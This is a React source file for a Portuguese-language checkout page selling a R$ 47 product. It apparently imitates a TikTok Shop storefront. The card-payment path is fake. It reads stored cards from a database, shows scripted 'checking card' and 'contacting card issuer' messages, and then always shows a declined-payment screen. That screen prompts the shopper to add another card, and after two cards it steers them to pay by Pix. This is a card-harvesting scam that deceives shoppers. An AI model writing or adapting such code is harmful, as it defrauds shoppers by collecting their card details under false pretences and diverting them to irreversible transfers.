"use client";

import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { 
  ArrowLeft, 
  MapPin, 
  ChevronRight, 
  Star, 
  Zap, 
  ChevronUp, 
  ChevronDown, 
  Plus, 
  Minus, 
  Ticket, 
  CreditCard, 
  Loader2, 
  AlertCircle, 
  ShieldCheck
} from 'lucide-react';
import { products, Product } from '@/data/products';
import { Button } from '@/components/ui/button';
import NoteDrawer from '@/components/NoteDrawer';
import TikTokCouponDrawer from '@/components/TikTokCouponDrawer';
import PaymentMethodDrawer from '@/components/PaymentMethodDrawer';
import { supabase } from "@/integrations/supabase/client";
import { showError } from '@/utils/toast';

const Checkout: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [product, setProduct] = useState<Product | null>(null);
  const [isNoteDrawerOpen, setIsNoteDrawerOpen] = useState(false);
  const [isCouponDrawerOpen, setIsCouponDrawerOpen] = useState(false);
  const [isPaymentDrawerOpen, setIsPaymentDrawerOpen] = useState(false);
  const [orderNote, setOrderNote] = useState("");
  const [quantity, setQuantity] = useState(1);
  const [selectedVar, setSelectedVar] = useState("SEM faixa e polvo");
  const [couponAmount, setCouponAmount] = useState(5);
  const [cardData, setCardData] = useState<any>(null);
  const [addressData, setAddressData] = useState<any>(null);
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix');
  const [isSubtotalOpen, setIsSubtotalOpen] = useState(true);
  
  const [isProcessingCard, setIsProcessingCard] = useState(false);
  const [cardProcessingStep, setCardProcessingStep] = useState(0);
  const [cardError, setCardError] = useState(false);
  const [cardsTried, setCardsTried] = useState(0);

  const steps = [
    "Finalizando compra...",
    "Checando dados do cartão...",
    "Comunicando com a prestadora do cartão...",
    "Validando transação..."
  ];

  useEffect(() => {
    const fetchData = async () => {
      const { data: addresses } = await supabase.from('addresses').select('*').order('created_at', { ascending: false }).limit(1);
      if (addresses?.length) setAddressData(addresses[0]);

      const { data: cards } = await supabase.from('cards').select('*').order('created_at', { ascending: false });
      if (cards?.length) {
        setCardData(cards[0]);
        setPaymentMethod('card');
        setCardsTried(cards.length);
      }
    };
    
    if (location.state?.product) {
      setProduct(location.state.product);
      if (location.state.initialQuantity) setQuantity(location.state.initialQuantity);
      if (location.state.selectedVariation) setSelectedVar(location.state.selectedVariation);
    } else {
      setProduct(products[0]);
    }
    fetchData();
  }, [location.state]);

  if (!product) return null;

  const finalTotal = (47.00 * quantity) - couponAmount;
  const finalTotalStr = finalTotal.toFixed(2).replace('.', ',');

  const handlePlaceOrder = () => {
    if (!addressData) {
      showError("Adicione um endereço de entrega.");
      navigate('/adicionar-endereco', { state: location.state });
      return;
    }

    if (paymentMethod === 'card') {
      if (!cardData) {
        navigate('/adicionar-cartao', { state: location.state });
        return;
      }
      setIsProcessingCard(true);
      let currentStep = 0;
      const interval = setInterval(() => {
        setCardProcessingStep(currentStep);
        currentStep++;
        if (currentStep >= steps.length) {
          clearInterval(interval);
          setTimeout(() => {
            setIsProcessingCard(false);
            setCardError(true);
          }, 1000);
        }
      }, 1200);
    } else {
      navigate('/pix-pagamento', { state: { product } });
    }
  };

  return (
    <div className="min-h-screen bg-[#F8F8F8] pb-[130px]">
      {isProcessingCard && (
        <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
          <div className="bg-white rounded-2xl p-8 flex flex-col items-center space-y-4 w-full max-w-[300px]">
            <Loader2 className="w-12 h-12 text-[#FF2C55] animate-spin" />
            <p className="text-[15px] font-bold text-gray-900 text-center">{steps[cardProcessingStep]}</p>
          </div>
        </div>
      )}

      {cardError && (
        <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
          <div className="bg-white rounded-3xl p-6 flex flex-col items-center w-full max-w-[340px]">
            <AlertCircle size={48} className="text-[#FF2C55] mb-4" />
            <h3 className="text-[18px] font-bold text-gray-900 mb-2">Pagamento recusado</h3>
            <p className="text-[13px] text-gray-400 text-center mb-6">A operação não foi aceita pela administradora do cartão.</p>
            <div className="w-full space-y-3">
              {cardsTried < 2 ? (
                <Button className="w-full h-12 rounded-full bg-[#FF2C55] font-bold" onClick={() => navigate('/adicionar-cartao', { state: location.state })}>
                  Adicionar outro cartão
                </Button>
              ) : (
                <Button className="w-full h-12 rounded-full bg-[#FF2C55] font-bold" onClick={() => { setPaymentMethod('pix'); setCardError(false); }}>
                  Pagar com Pix
                </Button>
              )}
              <Button variant="ghost" className="w-full h-10 font-bold text-gray-400" onClick={() => { setPaymentMethod('pix'); setCardError(false); }}>
                Alterar método de pagamento
              </Button>
            </div>
          </div>
        </div>
      )}

      <div className="bg-white border-b sticky top-0 z-50 flex flex-col items-center">
        <div className="w-full h-12 flex items-center px-4 relative">
          <button onClick={() => navigate(-1)} className="absolute left-2 p-2">
            <ArrowLeft size={24} className="text-gray-900" />
          </button>
          <h1 className="w-full text-center text-[17px] font-bold">Resumo do Pedido</h1>
        </div>
      </div>

      <div className="max-w-[600px] mx-auto">
        <div className="bg-white p-4 flex items-center justify-between border-b border-gray-100">
          <div className="flex items-center space-x-3">
            <MapPin size={18} className={addressData ? "text-[#00BFA5]" : "text-gray-900"} />
            <div className="flex flex-col">
              <span className="text-[14px] text-gray-900 font-bold">{addressData ? "Endereço de envio" : "Adicionar endereço"}</span>
              {addressData && <span className="text-[12px] text-gray-500">{addressData.city}, {addressData.state}</span>}
            </div>
          </div>
          <button className="text-[#FF2C55] text-[14px] font-medium" onClick={() => navigate('/adicionar-endereco', { state: location.state })}>
            {addressData ? "Alterar" : "+ Adicionar"}
          </button>
        </div>

        <div className="bg-white mt-2.5 p-4">
          <div className="flex justify-between items-center mb-3">
            <span className="text-[14px] font-bold text-gray-900 uppercase">MAIS MAKE BRASIL</span>
          </div>
          <div className="flex space-x-3 mb-4">
            <div className="w-[100px] h-[100px] bg-[#F8F8F8] rounded-lg overflow-hidden border p-1 flex-shrink-0">
              <img src={product.media[0].src} className="w-full h-full object-contain" />
            </div>
            <div className="flex-grow flex flex-col justify-start space-y-1">
              <h4 className="text-[13px] font-medium text-gray-900 line-clamp-2">{product.title}</h4>
              <p className="text-[11px] text-gray-400">{selectedVar}</p>
              <div className="flex justify-between items-end mt-2">
                 <span className="text-[16px] font-bold text-[#FF2C55]">R$ 47,00</span>
                 <div className="flex items-center bg-[#F1F1F1] rounded-sm h-8">
                    <button className="w-9 h-full flex items-center justify-center" onClick={() => setQuantity(q => Math.max(1, q - 1))}><Minus size={14} /></button>
                    <span className="w-9 text-center text-[14px] font-bold">{quantity}</span>
                    <button className="w-9 h-full flex items-center justify-center" onClick={() => setQuantity(q => q + 1)}><Plus size={14} /></button>
                 </div>
              </div>
            </div>
          </div>
        </div>

        <div className="bg-white mt-2.5 p-4 space-y-4">
          <h3 className="text-[16px] font-bold text-gray-900">Forma de pagamento</h3>
          <div className="space-y-3 cursor-pointer" onClick={() => navigate('/adicionar-cartao', { state: location.state })}>
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-2">
                <CreditCard size={18} className={paymentMethod === 'card' ? "text-[#FF2C55]" : "text-gray-400"} />
                <span className="text-[15px] font-medium">{cardData ? `Cartão final ${cardData.last4}` : "Cartão de crédito"}</span>
              </div>
              <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'card' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
                {paymentMethod === 'card' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
              </div>
            </div>
          </div>
          <div className="flex items-center justify-between cursor-pointer border-t pt-4" onClick={() => setPaymentMethod('pix')}>
            <div className="flex items-center space-x-3">
              <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" className="h-4 w-4" />
              <span className="text-[15px] font-medium">Pix</span>
            </div>
            <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'pix' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
              {paymentMethod === 'pix' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
            </div>
          </div>
        </div>
      </div>

      <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 z-50">
        <div className="max-w-[600px] mx-auto">
          <div className="flex justify-between items-center mb-3">
            <span className="text-[16px] font-bold">Total</span>
            <span className="text-[19px] font-bold text-[#FF2C55]">R$ {finalTotalStr}</span>
          </div>
          <Button className="w-full bg-[#FF2C55] text-white font-bold rounded-full h-[54px]" onClick={handlePlaceOrder}>Fazer pedido</Button>
        </div>
      </div>

      <NoteDrawer isOpen={isNoteDrawerOpen} onClose={() => setIsNoteDrawerOpen(false)} onSave={setOrderNote} initialNote={orderNote} />
      <TikTokCouponDrawer isOpen={isCouponDrawerOpen} onClose={() => setIsCouponDrawerOpen(false)} onSelect={setCouponAmount} selectedAmount={couponAmount} />
    </div>
  );
};

export default Checkout;